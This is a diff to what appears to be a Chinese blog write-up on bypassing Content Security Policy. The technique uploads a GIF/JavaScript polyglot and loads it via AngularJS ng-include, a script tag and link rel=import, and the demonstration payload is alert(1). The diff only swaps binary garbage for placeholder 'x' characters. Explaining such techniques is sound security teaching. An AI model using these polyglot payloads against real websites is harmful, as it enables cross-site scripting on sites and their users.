@@ -25,9 +25,7 @@ categories:
 ![](/img/ccsp/1.png)
 首先通过上传带有信息的gif图片,让gif与站在同源环境下
 ```
-GIF89ad=1/*d€!�,*/;alert(1)/*<script src="test.gif"></script>,dds剰┧�蹿嫵藜�嗏H栨墻晔额球L做嶇齄
-嚹Ⅰ圠*椞	岼г娡j奋嬊洳鶎N於�
-徦玺糊幭膑(8HXhx垬ǜ蓉桫iX;<link rel="import" href="test.gif" />*/
+GIF89ad=1/*xxxxxx*/;alert(1)/*<script src="test.gif"></script>,xxxxxxxxxxxxxxxxxxxxxxxxxxxxx<link rel="import" href="test.gif" />*/
 ```
 构造class=ng-include:"test.gif"来引用test.gif,angularjs会把gif的内容解析到页面内。
 ```
@@ -38,12 +36,10 @@ GIF89ad=1/*d€!�,*/;alert(1)/*<script src="test.gif"></scri
 <span style="visibility:hidden" class="ng-include:'test.gif' ng-scope">
 
 <span class="ng-scope">
-GIF89ad=1/*d�������!�,*/;alert(1)/*
+GIF89ad=1/*xxxxxxxxx*/;alert(1)/*
 </span>
 <script src="test.gif" class="ng-scope"></script>
-<span class="ng-scope">,dds��������ڋ�޼���H�扦�ʶ���L��������
-�Ģ��L*�̦�	�J�Ԫ���j�ܮ�������N�����
-�������������(8HXhx��������iX;
+<span class="ng-scope">,xxxxxxxxxxxxxx;
 </span>
 <link rel="import" href="test.gif" class="ng-scope">
 <span class="ng-scope">*/
@@ -60,9 +56,7 @@ GIF89ad=1/*d�������!�,*/;alert(1)/*
 <head>
 </head>
 <body>
-GIF89ad=1/*d�������!�,*/;alert(1)/*<script src="test.gif"></script>,dds��������ڋ�޼���H�扦�ʶ���L��������
-�Ģ��L*�̦�	�J�Ԫ���j�ܮ�������N�����
-�������������(8HXhx��������iX;<link rel="import" href="test.gif">*/</body>
+GIF89ad=1/*xxxxx*/;alert(1)/*<script src="test.gif"></script>,xxxxxxxx;<link rel="import" href="test.gif">*/</body>
 </html>
 ```
 ![](/img/ccsp/4.png)
